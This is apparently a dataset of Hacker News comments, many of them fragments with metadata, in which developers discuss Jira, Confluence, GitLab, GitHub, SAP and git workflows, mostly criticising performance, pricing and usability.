Nothing intelligent to say about that other than to wish I'd been a fly on the wall for the discussions about that.> Next, we asked ourselves the question: Do we want to continue to invest in implementing custom features for the Web IDE that ultimately deliver the same value as those already available in VS Code? Or do we embrace VS Code inside GitLab, and invest in extending the experience to more tightly integrate with GitLab and the DevOps workflow?I feel like if asking myself those questions I'd have come to the same answer, but it's certainly an interesting position.

Native support for Markdown in comments would be a good win.I actually like JIRA and Confluence and have generally had good experiences using them in multiple companies.

Maybe our process is a little over complicated. That's not a big deal. The thing that really gets me is performance.The performance is absolute dog shit. Every interaction with it painfully slow. For example, the page to view a single issue is almost 20MB fetched over 100 HTTP requests and takes 10 seconds to load. This is without cache. With assets cached, it is still 4 seconds to render. This is the fastest interaction by the way. Everything else is worse.Maybe some of this is my organization's fault. I really don't know.

If a branch is rebased, then comments on code that was changed get lost, and one has to go the Conversations tab and search for the comment there.  I understand that the commit itself is gone, which is fine, but I think an easy way to navigate through the comments, even if their context is lost, would be a great improvement.I am actually more interested in the suggestion to try VCS alternatives, though.

28671167	The hatred for atlassian products, I	The hatred for atlassian products, IMO, has a root cause in a few facts:1) it's an enterprise product, so the typical enterprise issue of: it's not being sold to the users, the people who it's being sold to don't have to feel the pain, and checking off features is more important than UX.2) that said, it's not the worst enterprise.  It is possible to configure atlassian products to have a really smooth UX (can't say the same about speed, the last I used atlassian, it was really, really, slow though that may have changed).  However, wrangling the product (and its users) is almost a full-time job, and atlassian is known to have breaking transitions that mess up your workflow with no recourse to go back to classic.

Like how at FB so many teams use spreadsheets to track their work (sometimes multiple spreadsheets per team, sometimes no tracking at all). There is some internal tooling, which is quite basic and at the time I was there it got deprecated without the replacement being finished yet. Whatever you say about JIRA, it can handle complex projects way better than a spreadsheet.My biggest issue with the whole thing, however, boiled down to the set of incentives that centered around individual performance.

  - the vulnerability uses ExifTool, so to exploit it, a user needs to be able to upload images
  - if an update is not (yet) possible, DjVu format file uploads can be blocked to avert this vulnerability
  - this vulnerability isn't relevant for GitLab instances that just have 1 user, or are not publicly accessible on the Internet

But it's just so much more darned convenient than hosting your own Git server! It would be super cool if there was a decentralized alternative to GitHub, that used Git under the hood. Perhaps one would upload their repositories to a node, which would then be synchronized with all other nodes, and all you would need to do to use it is to specify any_node.com/author/project.

This is obviously not production quality code, but just demonstrates the gist of the configuration.

Then, if the user exists (and is rewritten via nss-ato or something), they can login to the server.This saves a lot of trouble when off/on-boarding folks, since you can simply add/remove them from a github group to revoke or grant access to your machines."	withinboredom	8.511666	-6.187697	comment	6.0	30.0	1692820514	-11.618966

The first big issue for any moderately busy system is that you need to dedicate huge gobs of heap memory (think 16G+) to the tool.  After that, they suffer from poor schema design - there are tables that are literally missing indexes on commonly queried columns, and some columns that have delimited values embedded in them.It's hard for me to imagine that atlassian would allow individual instances of jira/confluence/etc in their cloud versions to get nearly as much resources as you need to give them on-prem.  The incentive would always be for them to try to minimize the amount of memory every instance gets, which does NOT maximize your individual performance.

The business rationalization makes a certain sort of sense.  If we burn, say, 4 hours a week manually cleaning up after bug X, but it would take 80 hours to fix it, maybe the return on investment doesn't compete well against other initiatives this quarter.  But in my experience, it often sends a message that we don't care about our users or our products.  That isn't something engineers can be proud of at the end of the day, and it makes it difficult to care about your work.

I've started with that - https://GitHub.com/GitJournal/git-auto-sync - but it's in the early stages.2. For mobile apps, a way to drastically reduce the overhead. Cross compiling libgit2 + deps + NDK is a major pain, and jGit uses more modern java features so you need to target a higher version of Android. (This was in early 2019, when I first started GitJournal)3. There is no competing with a simple http call vs the complexity of git. Plus the entire onboarding process.4.

You can reasonably expect to search it and find the projects you're looking for, and your account lets you use the issue tracker and pull requests on other projects. I think forges are unnecessary in general, but to wean people off of GitHub, FOSS forges like Gitea need to federate, so that you can search the whole space of public federated forges, and an account on one lets you open issues and pull requests on another.They seem to be making slow but steady progress on this at Gitea, maybe at other FOSS forges, too.

Does GitLab have some killer feature I'm not aware of that justifies spending 2-10x that of the competition?$99/m for Ultimate eds? It doesn't even explain on the pricing page what you get for that, beyond a couple of bullet points of biz-speak - it's almost like they think anyone who buys that kind of language has more money than sense.

I felt that there was so much potential to build things like CI, DevOps, and eventually a PaaS to compete with Heroku.

Originally developed it while looking for a documentation system for my mixed-technical-skill workplace. Wanted something easy to use without having to get finance involved when increasing our user count.With Confluence backing away from their self-hosted offerings, hopefully many will find BookStack useful. It's not supposed to be a direct replacement, and the design & content structure is quite opinionated, but it can serve many of the same use-cases as Confluence had served.	ssddanbrown	8.211963	-5.734413	comment	7.0	37.0	1641652108	-12.2074375

I've used Confluence for a good 4 years or so and for the life of me, I can not fathom why anyone would use this for storing documentation for code etc, as opposed to storing things direct in a repo. I can understand it's use somewhat for business folks, but even then, the way of organising things is abysmal, every solution (such as rich text editing) feels very off the shelf/MVP, uninspiring UI, the list goes on. It feels like most companies that use it already use the Atlassian stack of JIRA/Bitbucket, then feel the need to tack Confluence onto the end because it's there.

The main problem here is the user experience.When using GitHub I can find an open source project, copy the URL, pull it down, make changes, push and click a button for a pull request. A little bit convoluted but overall it's a very simple workflow. Now try decentralizing away from GitHub.

But this is no longer enough to keep evolving as a company of their size. Yet the internal product DNA still revolves around repos, so as a result, issues, wikis and now Projects (!) live under a single repository.This is backward.A project is a way to group resources to achieve a predefined goal. Those resources include multiple people, multiple issues and multiple repositories. Sticking a project under a repository makes no sense.In fact, a code repository in most organizations is a fairly small and an insignificant asset, just another way to organize code, i.e. function -> module -> directory ->	old-gregg	8.528206	-6.258741	comment	7.0	54.0	1473896124	-11.837787

Using the APIs is not copyright infringement (see Oracle v Google, if that was fair use this almost certainly is)Thus no copyright infringement has occurred.Still, keeping this in the codebase is at best boobytrapping your code to create accidental future instances of copyright infringement, and it's an interesting case of people not checking licenses (since it's pretty clear they didn't realize this in advance).	gpm	8.44256	-6.0387154	comment	7.0	48.0	1629637036	-11.683602

It was a comment on https://about.gitlab.com/releases/2013/08/22/introducing-git... but the comments there seem to have disappeared. So instead of making it proprietary we licensed it with an open source license but without offering a download, you had to pay to get access to the source code (this is similar to the Wordpress plugins and also not unlike Red Hat Enterprise Linux updates).We were afraid that people would put up a mirror with the paid code, this didn't happen.

Development is not something you should clock in and out of. A time-box in JIRA or GitHub shouldn't replace management being aware of what their team(s) are working on and how their progress is.It too often turns into a stick to beat developers with.There are all kinds of better metrics by which to hold developers accountable. Tracking time just puts developers off from improving code or refactoring.

But that perhaps proves the point - HN is very starup focusedThat’s pretty dismissive. I work at a company with ~80B in  revenue, I never interacted or heard of SAP in work context. In fact it is only incidentally that I’ve heard of them previously. There are hundred of thousands of engineers working in companies with 10-11 digit capitalizations that will never interact or hear about SAP.Edit: to clarify because I am getting a bunch of downvotes. My point is not about SAP’s penetration, it is that lots of engineers (even in companies that use SAP) might not encounter SAP products. The perspective “of you haven’t worked with SAP you are in a small org” is wrong.	ivalm	8.065071	-5.201744	comment	7.0	37.0	1589340038	14.065448

It's really hard as a user to affect the wrong repository, as you are gonna have to mentally and literally pause to write out the organization name + repository (httpie/httpie in this case) and	capableweb	8.499524	-6.194242	comment	7.0	38.0	1649975137	-11.797374

2) Update dependencies (because security)Personally, I fall into the second group (with caveats). I've found that Dependabot helps with the tedious work of updating versions by hand but at the same time provides a check so that I manually approve. This seems to work out to be a decent balance. I've also moved away from using :latest or @v2 etc. and switched to using commit hashes/image digests. Once again, Dependabot is helpful for tracking changes/updates once you switch over.The one annoying thing is that Dependabot does not always trigger on a regular basis (once a day) but I've found that bumping .github/dependabot.yml reliably triggers it."	newman314	8.635583	-6.21404	comment	7.0	31.0	1651165288	-11.4254055

I also know that open source beginners get really excited about their first small contributions, and I'm honestly happy to support that.- In contrast, the marginal effort for bot PRs is ~0. It's very easy to generate a small amount of work for a lot of people, and the nice side effect is that the bot's platform is advertised everywhere.

They haven't told anyone: it's just drifted into an unclear state of unmaintained-ness.I would suggest rather that what the Moment.js team have done here should be the norm: i.e., clear communication of the situation.

Not the occasional 10+ second page load, where you've accidentally clicked something that happens to generate a cascade of cache misses.  I can forgive that kind of infrequent performance hiccup.But rather, regular usage, especially of Confluence and Jira, just feels sluggish when doing bread and butter actions - adding a comment to a ticket or reloading a kanban view, loading a new page or opening the search dialog on Confluence.Yet, everything I've heard about the responsiveness of the 'cloud' offering is that it drives people to move to the on-prem server version.

Every time I try to search for something on GitHub, I have to sift through tons and tons of useless results from tests.Edit: The discussion has taken a weird turn into support for ignore files. To be clear, this feedback is about dynamically filtering searches when using a website to do code search, most likely searching someone else’s repo on someone else’s website; you don’t have access to the filesystem, the search form is the only input. So all this “rg supports ignore files” (I’m aware, but thanks) is not really relevant.	oefrha	8.634328	-6.1681376	comment	8.0	50.0	1606561960	-11.614806

It is an open source repository manager with a focus on performance, ease of use, and productivity (especially for larger projects).It's still in an early alpha stage, a lot of features are missing. The source code and the ability to self-host will be available within a month.There's GitHub, Bitbucket, GitLab, gogs. Why create another solution?

Of course this sort of situation is undesirable, demonstrably, but it's not necessarily a case of idiocy - it's actually very easy for non-technical founders to get into this situation: let's say the developers want to use JIRA, but the non-technical staff find JIRA impossible to use (totally reasonable), so they want to carry on using Trello; straight away you've got tasks spread across two disparate platforms.  Then let's say that a manager has an embedded belief from a past (probably non-startup) life that time-tracking by the hour is incredibly important, and they have a preferred tool for this (because, while JIRA has this functionality, it's pretty horrible, and Trello doesn't do it at all), and boom, you've got two different tools for trac	bshimmin	7.992863	-5.755623	comment	8.0	51.0	1495533540	-12.413075

There's no way to find or unstar a private repo that you starred while it was public. This would lead to the situation that if you unstar everything and make sure you have zero stars, you could wake up the next week with 1 starred repos, and then with 3 starred repos, because some repos went public again.- The users can see all their stars, but the private ones lead to a 404, which would be perplexing for a greater number of people than the current behavior.- All private repos that have been public at lea	diego_sandoval	8.493175	-6.162177	comment	8.0	31.0	1649981160	-11.744819

These are not unique tools, there are many options for issue tracking and email.I make this point because these solutions are trying to replicate smaller or larger chunks of github rather than provide alternative ways to use git.That said, Gita/Gogs is pretty.

Would depend entirely on jurisdiction and the specifics of the legislation.Sure... it's a fun/cool project with lots of tricky parts to get right/play with.

It's a tool that marks the sign that a company cares more about the management of staff as units, instead of caring about employees as breathing and creative forces.It makes management's job easier, but it does nothing for the managed, except lead to frustration and hundreds of emails that have to be waded through for that 5% chance of relevancy.Their integration seems particularly targeted to JIRA, when they've lapsed on many other useful features and improved UX implementations. It reflects GH's priorities as a company.It's a sign that github is catering to management over the programmer. Contrast that to gitlab, whose implementations are designed to make the programmer's job easier.	bpchaps	8.106847	-5.9488487	comment	8.0	47.0	1538709991	-12.287856

Then, once you submit a review, they only show 10 comments. In the middle, there’s an easy-to-miss “load more comments” button.These are the two most fundamental features of a PR.

This requires removing all friction to entering the proprietary ecosystem, including purchasing.

With Google Code shut down and Github losing 66 million in 9 months in 2016, it's an important question to ask about where you keep your source code.Featurewise, I haven't noticed anything that I can't use Gitlab for that I wanted to do. The interface is still less familiar to me than Github, but that seems to be a function of it being changed relatively often as well as the time spent looking at it.I also like how much Gitlab embraces open source.

You check in a new version of the first chapter where the character figures prominently, but the reviewer complains that the new character's plot arc never goes anywhere.The main goal of this diff-based code review seems to be to prevent people from checking in bad code.

And I still think most hatred of Jira ought to be directed at management for imposing bureaucracy and control through the tool, instead of the tool itself (I see this first hand as my current gig has grown from “startup” to “enterprise” in a few short years).But Atlassian has made a lot of questionable product decisions over the last many years, mostly in terms of UI/UX. What were once very much developer-centric interfaces are now geared to general enterprise product management.

There are plenty of ways to screw up email threading or forget conventions on labelling patchset versions or whatever (this happens all the time).

The reason we are excited to host this data is that we believe the community will be able to innovate and advance the state of the art much faster if it is provided in a tractable format for machine learning researchers.  This data is already public, however there is specialized knowledge required to acquire, parse, dedupe, and clean code from many programming languages at a massive scale on GitHub. We strived to reduce these barriers to encourage greater involvement.While we present the task of information retrieval as one possible use case of this dataset, we know there could be other practical applications of this data (i.e. code summarization).

At the time it seemed like a great decision. Now, as tech director I am looking to switch us back. It is very clear in my interactions with gitlab they do not care about small companies. Their pricing structure is bonkers and has completely catered out the middle. IMHO the jumping the shark moment was the IPO.I want gitlab to succeed. I’ve spent several sessions with various teams there sharing my feedback and it goes nowhere. I am not arrogant enough that I expect it to be implemented; there are no follow ups even for clarity or to say “thanks but no thanks”.How is their code search so broken at this point?

And concept-wise it's built very similar to the early jquery-ui releases (remember the first iPhone's menus?

A given device can pull branches of certain repos, and make commits to the branches.  But a device's user account on the git server doesn't have permission to affect past commits.  So, for example, if my dodgy Linux smartphone is compromised, a hypothetical person who isn't being nice can't do anything to my backups, other than make bogus additional	neilv	8.558536	-6.424415	comment	9.0	32.0	1615578679	-11.833081

At some point every industry grows up and standardizes on something, anything, because any standard is better than no standard.Git is far from an ideal solution, but it has emerged as the standard way to manage version control in a software project, and we benefit from there being a standard. Version control is the first barrier to entry in starting on a new project, so having an industry standard for version control benefits everyone: open source projects get more contributors, companies don't have to train new hires on their system, and employees have one fewer barrier blocking them from specific jobs.Could we have standardized on a better system? Certainly. But launching a competing standard at this point 	lolinder	8.551644	-6.436285	comment	9.0	142.0	1683036496	-11.880636

Github is turning from a neutral code hosting platform with a myriad of equally empowered third party integrations into the direction of a ""all in one"" dev tool and platform.I understand the internal pressures to do this: increased popularity, added value proposition for customers, more revenue.But: all the built-in tools will have an inherent advantage over third party solutions. This inevitably leads to increased lock-in and homogenization.I was very critical of the Microsoft acquisition for similar reasons, and considering the "	the_duke	8.466024	-6.173397	comment	10.0	45.0	1558604219	-11.799049

When I end a relationship, and remove that person from my private repo, I want their fork of my code to go away too.Why? Because it's cleaner. It means there are no abandoned copies of my codebase sitting around forever forgotten in random Github accounts. I set up a private repo because I want to control access to my code. That's why a private repo is private.It also makes it harder for people to misrepresent their relationship to me later on. Sure, anyone with read access to one of my repos can pull it down and save a local copy. But that is different from logging into Github and having a fork of my repo.

GitHub isn’t just Git hosting, but a social network of open source developers and projects. You can’t migrate stars, issues with comments and the history of PRs, all linked to the profiles of their authors.And sure you can self-host GitLab, I pushed for it at my previous employer and works great for on premises deployments, but it’s not the same for OSS if the community you care about isn’t there.That said I am glad to see Nat Friedman as the new CEO.

If so, why?It may be myopic, but the only major reason I can think of is visibility if you plan on publicizing the repo at some point. But you can achieve this by using GitHub as a mirror for your main repo on another platform (at least for GitLab, I’m not familiar with BitBucket).Edit:
Personally, I use GitLab (both .com and I've set up/maintain several sefl-hosted solutions). I originally tried out GitLab due to lack of private repos on GitHub, and I don't see a reason I should switch back at this point.

The recent security issue at GH has also turned me off even more on Git hosting services.For closed source projects maybe it's just best to store encrypted backups off site and spin up a self hosted option whenever collaboration is needed.

I would have expected that the repos were broken up into individual objects and stored in an object store. This should make pushes much faster as you have basically infinitely scalable writes. However it does make pulls more difficult. However computing packfiles could still be done (asynchronously) and with some attention to data-locality it should be possible.This would be a huge rewrite of some internals but seems like it would be a lot easier to manage. It would also provide a some benefits as objects could be shared between repos (although some care would probably be necessary for hash collisions) and it would remove some of the oddness about forks (as IIUC they effectiv	kevincox	8.552129	-6.3860984	comment	10.0	50.0	1615913653	-11.8815975

Just use Libre Office and git commit them to your github repo for others to look at it.

Beyond blazingly fast(tm). You need a reason for people to offer up their credit cards, or better, their accounting PO process. You need a feature you withhold or a service you provide from the open source offering to make it appealing.GitLab restricts CI/CD to paying customers.

Another complexity especially now is the different paradigm changes in between. ABAP, the programming language of SAP, is quite nice nowadays. CDSViews are a great invention, and so on.

We recently moved from a self-hosted git solution to GitLab, and while the CI, 'namespacing' and issue tracking are truly great and well thought of, we've had entire days where the team was unable to deploy because the CI workers did not run (even though we host the workers), and therefore the artifacts for deployment were never generated. And nearly every day, pushes take minutes to complete, as opposed to a few seconds with GitHub.If anything, I hope that Microsoft's acquisiton of GitHub means that GitHub is going to keep growing in features for varied enterprise uses, and that we're going to see even more competition in this area.	adrinavarro	8.386095	-6.2803974	comment	11.0	83.0	1528071491	-11.928335

Personally I never look at the star count because even if they were legit, they don't really tell me anything more useful than I get from looking at other things in the repo.I tend to check the age difference between the earliest and latest commits because that lets me be sure it's not a project that someone spent a couple weeks coding up, dropped on github, and then forgot about. I'll also check the issues on there. I'm looking for more closed issues than open ones, but I'll also quickly scan over them to get a rough idea of how many are truly meaningful issues. I also get signals from the readme and docs. It's not a hard pass if there's issues with those, but it's certainly helpful to my opinion if they exist and are both clear 	ziml77	8.459326	-6.1456804	comment	11.0	52.0	1679148394	-11.808009

The problem with losing slightly there is that the advantage compounds; if developers find it easy to make and share, then they make and share which makes more people make and share and generates tons of value for a platform.It may not be safe, but being able to:    - uses: some-developer/some-repo@some-branch

We update the version in source to the next logical version (usually a patch bump with an alpha0 pre-release tag) immediately after tagging and publishing a release. This way you just need to look at the version in source to understand where you're at in a release process, and only a single commit has the full release version in source, which is also tagged as such.

Cody remains open source (Apache 2) in the client/cody* directories in the repository, and we're extracting that to a separate 100% OSS repository soon.Our licensing principle remains to charge companies while making tools for individual devs open source. Very few individual devs (or companies) used the limited-feature open-source variant of code search, so we decided to remove it. Usage of Sourcegraph code search was even more skewed toward our official non-OSS build than in other similar situations like Google Chrome vs. Chromium or VS Code vs. VSCodium. Maintaining 2 variants was a burden on our engineering team that had very little benefit for anyone.You can see more explanation at https:/	sqs	8.708857	-6.041915	comment	12.0	111.0	1688483728	-11.498648

I'm so glad we went ahead with self hosted gitlab. We installed it on a CentOS server at our premise, SSL'd via Let's encrypt, I've even set up a dedicated gitlab runner to use Gitlab CI for continuous delivery and so far the testing is progressing pretty smoothly.All this for $0.Update:I agree, gitlab and github will cost the same in the long run. Time costs money and self hosted has a lot of downsides as well.However, gitlab being self hosted (and not costing anything in terms of separate invoice) makes us feel like we're more in control and are somehow saving some money (as we add more developers as well).

18848736	While I think this is a great move, 	While I think this is a great move, don't forget that private repos also means no more free Travis CI.Gitlab CI however offers 2,000 build minutes a month with their integrated CI service.Even if your whole set up takes 10 minutes to build on CI, that's 200 builds a month which is plenty for an individual project that's on a private repo.In other words, I think Gitlab's free private repos + CI is still a better choice for a solo developer who wants private repos since CI is such a useful tool and other external CI services have much more limited free plans (to use with Github instead). Having everything in the same UI is also really useful, which is another win for Gitlab.I prefer Github's UI for overall repo exploration and issues, etc.. but I'm not sure if I'll move my private repos over	nickjj	8.480073	-6.413563	comment	12.0	67.0	1546887862	8.99948

And once the feature is released, there's no removing it.This means performance gradually ratchets slower and slower - until it becomes intolerable. And by then, different performance issues will be everywhere in the codebase, so fixing them will seem an insurmountable challenge.Far cheaper to ignore the problem.

17223357	For people wondering what makes GitL	For people wondering what makes GitLab any different, the answer is that GitLab is an open source product at its core. This means that anybody can run their own instance. If the company ends up moving in a direction that the community isn’t comfortable with, then it’s always possible to fork it.There’s also a proposal https://gitlab.com/gitlab-org/gitlab-ee/issues/4517 to support federation between GitLab instances. With this approach there wouldn’t even be a need for a single central hub. One of the main advantages of Git is that it’s a decentralized system, and it’s somewhat ironic that GitHub constitutes a single point of failure.In theory this could work similarly to the way Mastodon works currently.

Sure, sometimes it's annoying to fix things in the stack, but I've found that keeping PRs small is an overall velocity (and safety) win in the long run.Diffs that are > 500 lines either tend to sit in code review for several days or get the lazy accept and break something. If I absolutely cannot stack for some reason, I'll put up the PR, then set up time with some teammates to review it together.

We have an in-house developed tool that tracks git and mercurial commits and calculates the test coverage and code quality for each individual developer.2. We use jira to track the number of points each developer burns (points are shared between developer, reviewer and QA). We also track the number of bugs each developer introduces because closing a bugfix is not possible without first assigning the developer who introduced the bug to the jira task.3. We use peer reviews where each team member rates each other team member on a scale from 1 to 5 (3 being considered sufficient) on aspects like availability, communication, reliability and result orientation.4.

For decades, they used an internally developed system for lab reports (they had a few programmers and admins they called the ""nerds"" that did nothing else than extend and maintain the system). The company switched to a SAP solution a few years ago. Chaos ensued. The SAP solution missed so many edge cases that a huge number of lab reports were either inaccurate or completely wrong because information was lost in SAP translation between different labs. Sometimes clients (huge international players) noticed the mistakes, which then led to costly product delays. It became so bad that communication between labs eventually had to be done on two levels - within SAP, and ""informally"" by mail, telephone, or by simply walking to the other lab, adding a"	lqet	8.061126	-5.2026315	comment	13.0	124.0	1662717541	14.065052

It just seems inevitable to me.However, decentralized hosting and governance might make it so that there can't be a hostile takeover and incorrect (relative to license) usage of FOSS code. I'm thinking something akin to IPFS but more specialized towards e.g git repository hosting.Not sure how such hosting would be feasible in terms of breaking even between hosting costs, but a decentralized service hosting distribu"	swagonomixxx	8.496284	-6.2719817	comment	13.0	79.0	1656798010	-11.823617

Evidence suggests that as early as October 2019, these attackers have been testing their ability to insert code by adding empty classes.Unless this a compromise of the build machine, it sounds suspiciously like a lack of code review standards to me.In our organization, the only way to get a line of code into master is through a process where a 2nd developer reviews and approves via GitHub.

And it's been slow for so many years now, I assume they have no interest or ability to fix it. And their slow drift towards cloud installs over letting people self host isn't helping them either since, embarrassingly, their cloud instances seem to be even slower.(Incidentally, there's a lot of competition in that space, but I've be	Lazare	7.9949026	-5.7708797	comment	15.0	73.0	1609434115	-12.391365

We have to assume that there are problems of a similar nature in their cloud service, which is way more of a problem considering the number of orgs that depend on the JIRA SaaS offering.Maybe the founders could have used some of that time spent planning a tunnel between their side-by-side $100M houses, or engaged in Twitter rants, to actually bother delivering value to customers. It’s only a matter of time before this product suite is disrupted, and it might represent one of the most obvious low-hanging opportunities in our entire industry.I still remember being in line at a WWDC a few years back, o	numair	8.068014	-5.7554274	comment	15.0	174.0	1630931389	-12.3689165

No, the real issue is gits configurability.  Not just the configurability but the enforced decentralization of that configurability.For better or worse, it seems like git is actively hostile to any kind of concept of a central authority.  Can I configure hooks for my team?  No.  Can I configure diff tools for my team?  No.  Can set recursive pulls to be the default?  No.  Can I enforce line endings?  No.  Can I even enforce LFS is setup right?

The hope was to drop Jira, which was also being used for project planning, and fully adopt GitLab, but the costs were simply unjustifiable.Basically GitLab ended up being a full order of magnitude more expensive. Even with discounts, which got things closer (but not all the way there), the fear was after a period of time, the discounts would be ended/phased out and we'd be stuck.I'd love to see those features that compete directly with Jira (like roadmaps and multi-level epics) come down to the Premium level, which is more price/feature competitive.We love GitLab	dak1	8.294867	-6.345586	comment	16.0	105.0	1611690119	-12.0149

Complain, write letters/emails to Docker, make your opinion heard, etc. But remember that you are dealing with a fellow human-being, who has their own life and own emotions.

I often think scary popup boxes are enough to get people to think about what they're doing, but this example clearly demonstrates that what's important is to use design not to scare (alone?), but to convey the information which makes a dangerous action dangerous as well.

They think that the more recent the last commit is, the better supported the library is.But what about an archived project that does exactly what you need it to do, has 0 bugs, and has been stable for years? That’s like finding a hidden gem in a thrift store!Most engineers I see nowadays will automatically discard a library that is not ""constantly"" updated... Implying it's a good thing :)"	vrnvu	8.73461	-6.1082783	comment	18.0	81.0	1703782402	-9.127407

I had asked him if he was using Git to manage his little pet project the company gave him to play with. “No”, he replied, he didn’t know what the company’s policy was to posting code in public on GitHub. As I explained to him that “git init” was all he needed, no GitHub or even no repository on our local GitLab was necessary, his eyes grew wide: “But how does that work??”I’ve had to explain this same thing to multiple novice devs of various ages. It baffles me. I consider it one of the greatest ironies of software development today.It’s like explaining to people that they could just talk to each	travisgriggs	8.51716	-6.414254	comment	18.0	151.0	1656599342	-11.870618

This includes even interacting with US banking infrastructure. So being headquartered somewhere else doesn't help; you have to comply.

Open a support ticket, you will get some superficial pointers to documentation, and then be completely ignored.Their Product team is the absolute worst too. There are so many things that can make life easier for users (better configurability for CODEOWNERS notification?) and they will flat out ignore you.Gitlab on the other hand seem much more responsive to users... their actions speak volumes. They recognized the need for integrated CI/CD with code and instead of stealing TravisCIs ideas (cough GitHub Actions Cough), they built one years ago.I really do	pm90	8.344037	-6.3561244	comment	19.0	117.0	1568730301	-11.965699

38432910	I'm ready to believe the most charit	I'm ready to believe the most charitable explanation for this: the new code search (which I have found to be exceptionally good) has a lot more going on under the hood than a normal search engine, which makes it a lot more resource-intensive - limiting it to signed-in accounts saves a huge amount of server resources that would otherwise be used to serve crawlers.My guess is that the trade-off here is genuinely a question of if they spend 3-4x (I'm guessing, but I think this is likely a low-ball estimate) on their search infrastructure, v.s. having people angry at them for requiring login to use the feature.I actually built my own code search tool for use with GitHub repos, but I've mostly stopped using that because the new GitHub code search is so useful by default: https://simonwillison.n	simonw	8.663797	-6.0940156	comment	19.0	139.0	1701096871	-11.644506

A more productive use of time would be to understand the reason for the policy, document out why it doesn't apply to your case and then attempt to get approval.For instance, there's a restriction at my workplace (not a software company, a regular old industry fortune 500) which prevents git installs from pushing to any non corporate GitHub repo from our work machines.The obvious reason it exists is to prevent people (a lot of who are analysts or data scientists - not professional programmers) from shooting thems	sfifs	8.478755	-6.2230544	comment	20.0	235.0	1597830503	-11.821431

This basically means that, depending on your level of paranoia, you will have to review all code that has ever interacted with Github repositories, and any code pushed or pulled from private repositories can no longer be considered private.Github's customers trust GH/MS with their code, which, for most businesses, is a high value asset.

32396115	People on Twitter are either wilfull	People on Twitter are either wilfully dumb or simply ignorant.GitHub had to do this. It was required of them by law. Tornado was sanctioned.> These prohibitions include the making of any contribution or provision of funds, goods, or services by, to, or for the benefit of any blocked person and the receipt of any contribution or provision of funds, goods, or services from any such person.This is, unambiguously, directed toward entities such as GitHub providing them service.I'm not a fan of GH these days but they did the only thing they could do in this situation. You can be upset about it, but you can't be upset at GitHub about it.	junon	8.477111	-6.147163	comment	21.0	304.0	1660041577	-14.179156

Fixing a bug or delivering a feature where you haven't documented the process, (how the criteria were decided, when it was tested and deployed) is as good a running a web site nobody visits. JIRA hate comes from the bottom up. Developers don't like having to have their work parceled out so specifically. But it's not for them. It's for managers and stakeholders who have to report progress and who are responsible for budgets. If devs aren't working on priority items, are off target to timelines, are not following QA process or not following agreed specs then the company could be losing money. And developers are expensive as hell.And I've also never worked anywhere that had a better option than JIRA.	tootie	7.9787226	-5.764286	comment	22.0	217.0	1609436526	-12.413123

Meaning if someone compromises your hosted origin, they can quietly compromise your history. So even the fears about data leaks aside, this is a big win for safety.From an entrepreneurial perspective, this is my favorite thing we've done at Keybase. It pushes all the buttons: (1) it's relatively simple, (2) it's filling a void, (3) it's powered by all our existing tech, and (4) it doesn't complicate our product.  What I mean by point 4 is that it adds very little extra UX and doesn't change any of the rest of the app. If you don't use git, cool. If you do, it's there for you.What void does this fill?

Things don't need to be maintained and updated for eternity.In my mind, the best software engineering is where you solve a problem once and your solution just works and needs no configuration or maintenance or updates.This of course has a very low chance of happening if your system has to exist as a part of ""ecosystem"" where you expect/assume the presence of some external service that can change its API on a whim (or just disappear).Yes, to a certain degree it's impossible to design software that does not exist as a part of an ecosystem, which is why I put it in quotes.Some APIs are stable and are guaranteed to continue to exist for a very long "	hsn915	8.489672	-6.1752734	comment	23.0	176.0	1632670388	-11.851504

It's like the C++ of ticketing software--it does everything because no one wanted to sit down and think critically about the use cases and instead decided it would be easier to say ""yes"" to every single feature request. It definitely feels like whoever is buying JIRA is not on the team who is using it (maybe IT or finance) because it ticks their boxes and it has such a huge list of features that nominally it appears to tick the product development boxes (ignoring more subjective concerns like ""quality"", ""performance"", and ""usability"").I would really like to try working in an organization that uses something simpler, like Trello (although now that this is also an Atlassian property, maybe not exactly Trello?)."	throwaway894345	7.9795704	-5.762185	comment	24.0	141.0	1649867402	-12.446045

Many companies have built entire workflows (not just development related) around Jira, and have huge knowledge bases in Confluence.
Switching would come with a lot of effort.I will say that most of the Atlassian products are ... not great.Bitbucket has completely stagnated and is way worse than Github and Gitlab.
They actually had an opportunity there. Once upon a time Bitbucket was the only site to offer free private repos, and it attracted a decent number of users "	the_duke	8.096521	-5.8991585	comment	24.0	115.0	1656581473	-12.283507

22246417	I teach enterprise systems at a univ	I teach enterprise systems at a university, with emphasis on SAP.It's hideous.  Hideous.  My students complain it is unusable (agree), doesn't make sense (agree), that they can't see the point (agree).When you look at the underlying database 'schema' (inverted commas deliberate) you'll find it's a massive, denormalised mess.Much of what SAP can do can be done at the local level using intuitive software.  Reports, for example, against a well-designed schema or data warehouse are easy.  Power BI, Tableau, whatever your poison.  You can even aggregate and present data in raw SQL if you like.  Each technique is far easier than trying to achieve the same in SAP.What SAP does do well is multinational, enterprise-wide integration.  Are you a company comprised of many mergers and acquisitions?  Yo	mr_gibbins	8.060565	-5.2022047	comment	26.0	195.0	1580908391	14.063892

Any company that requires candidates to have significant open source contributions is going to have a hard time hiring, because it’s not very common.Really, the only time side projects are valuable is when someone needs to fill gaps in their resume. For example, if all of your prior experience was writing PHP backend code but you wanted to apply to a React front-end role, it could be helpful to have something like a React TODO app in your GitHub profile to show that you have some minimal experience w	PragmaticPulp	8.452977	-6.0632734	comment	26.0	140.0	1626350945	1.9352112

Your workflows grow to 500-1000 lines and start having all sorts of nonsense like conditionals and the YAML becomes disgusting and hard to understand. Github actions becomes a nightmare and you've invited vendor lock in.2) Configure with github actions. Always ask yourself ""can I push this YAML complexity into a script?"" and do it if you can. Send an email? Yes, that can go in a script. Your workflow ends up being about 50-60 lines as a result and very rarely needs to be changed once you've set up.

I regularly search for things like how to concatenate strings or the syntax of a for loop in some language. I also use the internet for higher level things like how memory management works on some system, or how something like an ECS architecture works.

When I brought this up at my last company it got dismissed as being 'too technical'.I know git can be tricky but it cannot be that difficult to teach people from non technical departments add, commit and push and then show maybe one person from each department how to solve conflicts. Alternatively, build non technical people a web interface for editing and committing but allow the devs to just use git as standard. Or there's Obsidian's built in sync but I don't know enough about it to know if it scales well in large organisations.What absolutely is definitely	rcarr	8.513465	-6.092543	comment	30.0	171.0	1669146588	-11.892864
